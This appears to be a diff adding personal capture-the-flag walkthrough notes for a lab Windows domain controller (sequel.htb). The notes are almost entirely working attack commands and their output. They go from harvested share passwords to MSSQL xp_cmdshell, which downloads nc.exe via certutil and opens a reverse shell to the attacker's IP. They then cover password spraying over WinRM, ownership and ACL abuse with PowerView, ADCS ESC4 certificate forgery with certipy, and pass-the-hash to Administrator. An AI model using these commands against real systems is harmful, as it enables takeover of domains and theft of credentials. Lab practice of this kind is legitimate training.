@@ -1,0 +1,424 @@
+As is common in real life Windows pentests, you will start this box with credentials for the following account:
+ rose / KxEPkKe6R8su
+
+
+┌──(kali㉿kali)-[~]
+└─$ bloodhound-python -u rose -p 'KxEPkKe6R8su' -d sequel.htb -dc DC01.sequel.htb -ns 10.10.11.51 -c all --zip --disable-autogc
+...
+INFO: Compressing output into 20250806053422_bloodhound.zip
+
+
+
+Grab xlsx files from Accounting Department shares
+They are corrupted, fix using hexeditor
+Only one file works, regardless.
+
+First Name	Last Name	Email	Username	Password
+Angela	Martin	angela@sequel.htb	angela	0fwz7Q4mSpurIt99
+Oscar	Martinez	oscar@sequel.htb	oscar	86LxLBMgEWaKUnBG
+Kevin	Malone	kevin@sequel.htb	kevin	Md9Wlq1E5bZnVDVo
+NULL	NULL	sa@sequel.htb	sa	MSSQLP@ssw0rd!
+
+
+┌──(kali㉿kali)-[~]
+└─$ netexec smb 10.10.11.51 -u oscar -p 86LxLBMgEWaKUnBG
+SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.51     445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG 
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ nxc mssql 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --local-auth
+MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
+MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ impacket-mssqlclient sequel.htb/'sa:MSSQLP@ssw0rd!'@10.10.11.51
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL (sa  dbo@master)> enable_xp_cmdshell
+SQL (sa  dbo@master)> EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.14.16:4000/nc.exe C:\Users\sql_svc\Desktop\nc.exe';
+output                                                
+---------------------------------------------------   
+****  Online  ****                                    
+
+  0000  ...                                           
+
+  e800                                                
+
+CertUtil: -URLCache command completed successfully.   
+
+NULL                                                  
+
+SQL (sa  dbo@master)> 
+SQL (sa  dbo@master)> EXEC xp_cmdshell 'C:\Users\sql_svc\Desktop\nc.exe -e cmd.exe 10.10.14.16 4444';
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444                       
+listening on [any] 4444 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.11.51] 50583
+Microsoft Windows [Version 10.0.17763.6640]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>cd ../..
+cd ../..
+
+C:\>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 3705-289D
+
+ Directory of C:\
+
+11/05/2022  12:03 PM    <DIR>          PerfLogs
+01/04/2025  08:11 AM    <DIR>          Program Files
+06/09/2024  08:37 AM    <DIR>          Program Files (x86)
+06/08/2024  03:07 PM    <DIR>          SQL2019
+06/09/2024  06:42 AM    <DIR>          Users
+01/04/2025  09:10 AM    <DIR>          Windows
+               0 File(s)              0 bytes
+               6 Dir(s)   3,806,650,368 bytes free
+
+C:\>cd SQL2019
+cd SQL2019
+
+C:\SQL2019>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 3705-289D
+
+ Directory of C:\SQL2019
+
+06/08/2024  03:07 PM    <DIR>          .
+06/08/2024  03:07 PM    <DIR>          ..
+01/03/2025  08:29 AM    <DIR>          ExpressAdv_ENU
+               0 File(s)              0 bytes
+               3 Dir(s)   3,806,650,368 bytes free
+
+C:\SQL2019>cd ExpressAdv_ENU
+cd ExpressAdv_ENU
+
+C:\SQL2019\ExpressAdv_ENU>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 3705-289D
+
+ Directory of C:\SQL2019\ExpressAdv_ENU
+
+01/03/2025  08:29 AM    <DIR>          .
+01/03/2025  08:29 AM    <DIR>          ..
+06/08/2024  03:07 PM    <DIR>          1033_ENU_LP
+09/24/2019  10:03 PM                45 AUTORUN.INF
+09/24/2019  10:03 PM               788 MEDIAINFO.XML
+06/08/2024  03:07 PM                16 PackageId.dat
+06/08/2024  03:07 PM    <DIR>          redist
+06/08/2024  03:07 PM    <DIR>          resources
+09/24/2019  10:03 PM           142,944 SETUP.EXE
+09/24/2019  10:03 PM               486 SETUP.EXE.CONFIG
+06/08/2024  03:07 PM               717 sql-Configuration.INI
+09/24/2019  10:03 PM           249,448 SQLSETUPBOOTSTRAPPER.DLL
+06/08/2024  03:07 PM    <DIR>          x64
+               7 File(s)        394,444 bytes
+               6 Dir(s)   3,806,650,368 bytes free
+
+C:\SQL2019\ExpressAdv_ENU>type sql-Configuration.INI
+type sql-Configuration.INI
+[OPTIONS]
+ACTION="Install"
+QUIET="True"
+FEATURES=SQL
+INSTANCENAME="SQLEXPRESS"
+INSTANCEID="SQLEXPRESS"
+RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
+AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
+AGTSVCSTARTUPTYPE="Manual"
+COMMFABRICPORT="0"
+COMMFABRICNETWORKLEVEL=""0"
+COMMFABRICENCRYPTION="0"
+MATRIXCMBRICKCOMMPORT="0"
+SQLSVCSTARTUPTYPE="Automatic"
+FILESTREAMLEVEL="0"
+ENABLERANU="False" 
+SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
+SQLSVCACCOUNT="SEQUEL\sql_svc"
+SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
+SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
+SECURITYMODE="SQL"
+SAPWD="MSSQLP@ssw0rd!"
+ADDCURRENTUSERASSQLADMIN="False"
+TCPENABLED="1"
+NPENABLED="1"
+BROWSERSVCSTARTUPTYPE="Automatic"
+IAcceptSQLServerLicenseTerms=True
+
+C:\SQL2019\ExpressAdv_ENU>
+
+C:\SQL2019\ExpressAdv_ENU>net user
+net user
+
+User accounts for \\DC01
+
+-------------------------------------------------------------------------------
+Administrator            ca_svc                   Guest                    
+krbtgt                   michael                  oscar                    
+rose                     ryan                     sql_svc                  
+The command completed successfully.
+
+
+C:\SQL2019\ExpressAdv_ENU>
+
+
+nxc winrm sequel.htb -u Users.txt -p 'WqSZAF6CysDQbGb3'
+...
+
+┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\ryan\Documents> 
+
+
+
+Ryan has WriteOwner over ca_svc
+
+o change the ownership of the object, you may use Impacket's owneredit example script (cf. "grant ownership" reference for the exact link).
+
+owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'
+To abuse ownership of a user object, you may grant yourself the GenericAll privilege.
+
+Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).
+
+dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'
+Cleanup of the added ACL can be performed later on with the same tool:
+
+Targeted Kerberoast
+A targeted kerberoast attack can be performed using targetedKerberoast.py.
+
+targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'
+The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well.
+
+The recovered hash can be cracked offline using the tool of your choice.
+
+Force Change Password
+Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line.
+
+net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"
+Pass-the-hash can also be done here with pth-toolkit's net tool. If the LM hash is not known it must be replace with ffffffffffffffffffffffffffffffff.
+
+pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"
+Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab.
+
+Shadow Credentials attack
+To abuse this privilege, use pyWhisker.
+
+pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"
+For other optional parameters, view the pyWhisker documentation.
+
+
+but we will use PowerView.ps1 instead
+
+*Evil-WinRM* PS C:\Users\ryan\Downloads> upload PowerView.ps1
+                                        
+Info: Uploading /home/kali/PowerView.ps1 to C:\Users\ryan\Downloads\PowerView.ps1
+                                        
+Data: 1027036 bytes of 1027036 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\ryan\Downloads> Import-Module .\PowerView.ps1
+*Evil-WinRM* PS C:\Users\ryan\Downloads> Set-DomainObjectOwner -Identity "ca_svc" -OwnerIdentity "ryan"
+*Evil-WinRM* PS C:\Users\ryan\Downloads> Add-DomainObjectAcl -TargetIdentity "ca_svc" -Rights ResetPassword -PrincipalIdentity "ryan"
+*Evil-WinRM* PS C:\Users\ryan\Downloads> $cred = ConvertTo-SecureString "Password123!!" -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\ryan\Downloads> Set-DomainUserPassword -Identity "ca_svc" -AccountPassword $cred
+*Evil-WinRM* PS C:\Users\ryan\Downloads> 
+
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ certipy-ad find -u 'ca_svc@sequel.htb' -p 'Password123!!' -dc-ip 10.10.11.51 -stdout
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+...
+  33
+    Template Name                       : DunderMifflinAuthentication
+    Display Name                        : Dunder Mifflin Authentication
+    Certificate Authorities             : sequel-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireDns
+                                          SubjectRequireCommonName
+    Enrollment Flag                     : PublishToDs
+                                          AutoEnrollment
+    Extended Key Usage                  : Client Authentication
+                                          Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 1000 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2025-08-21T08:35:28+00:00
+    Template Last Modified              : 2025-08-21T08:35:28+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : SEQUEL.HTB\Enterprise Admins
+        Full Control Principals         : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Cert Publishers
+        Write Owner Principals          : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Cert Publishers
+        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+                                          SEQUEL.HTB\Cert Publishers
+        Write Property Enroll           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : SEQUEL.HTB\Cert Publishers
+    [+] User ACL Principals             : SEQUEL.HTB\Cert Publishers
+    [!] Vulnerabilities
+      ESC4                              : User has dangerous permissions.
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ 
+
+
+┌──(kali㉿kali)-[~]
+└─$ certipy-ad template -u ca_svc@sequel.htb -p 'Password123!!' -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -ldap-scheme ldap -ldap-port 389 -ldap-simple-auth -no-ldap-signing -no-ldap-channel-binding -write-default-configuration -force       
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Saving current configuration to 'DunderMifflinAuthentication.json'
+[*] Wrote current configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
+[*] Updating certificate template 'DunderMifflinAuthentication'
+[*] Replacing:
+[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
+[*]     flags: 66104
+[*]     pKIDefaultKeySpec: 2
+[*]     pKIKeyUsage: b'\x86\x00'
+[*]     pKIMaxIssuingDepth: -1
+[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
+[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
+[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
+[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
+[*]     msPKI-Enrollment-Flag: 0
+[*]     msPKI-Private-Key-Flag: 16
+[*]     msPKI-Certificate-Name-Flag: 1
+[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
+[*] Successfully updated 'DunderMifflinAuthentication'
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ 
+
+doing it again
+
+
+┌──(kali㉿kali)-[~]
+└─$ certipy-ad template -u ca_svc@sequel.htb -p 'Password123!!' -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -write-default-configuration 
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Saving current configuration to 'DunderMifflinAuthentication.json'
+File 'DunderMifflinAuthentication.json' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote current configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
+[*] Updating certificate template 'DunderMifflinAuthentication'
+[*] Replacing:
+[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
+[*]     flags: 66104
+[*]     pKIDefaultKeySpec: 2
+[*]     pKIKeyUsage: b'\x86\x00'
+[*]     pKIMaxIssuingDepth: -1
+[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
+[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
+[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
+[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
+[*]     msPKI-Enrollment-Flag: 0
+[*]     msPKI-Private-Key-Flag: 16
+[*]     msPKI-Certificate-Name-Flag: 1
+[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
+Are you sure you want to apply these changes to 'DunderMifflinAuthentication'? (y/N): y
+[*] Successfully updated 'DunderMifflinAuthentication'
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ certipy-ad req -username ca_svc@sequel.htb -p 'Password123!!' -ca sequel-DC01-CA -template DunderMifflinAuthentication -target dc01.sequel.htb -upn administrator@sequel.htb
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: dc01.sequel.htb.
+[!] Use -debug to print a stacktrace
+[!] DNS resolution failed: The DNS query name does not exist: SEQUEL.HTB.
+[!] Use -debug to print a stacktrace
+[*] Requesting certificate via RPC
+[*] Request ID is 14
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator@sequel.htb'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrator.pfx'
+File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote certificate and private key to 'administrator.pfx'
+                                                                
+
+┌──(kali㉿kali)-[~]
+└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.51 
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@sequel.htb'
+[*] Using principal: 'administrator@sequel.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+File 'administrator.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ 
+
+┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i 10.10.11.51 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        8/20/2025  11:30 PM             34 root.txt
+
+
+
+
+
+
+
+
+
+
+
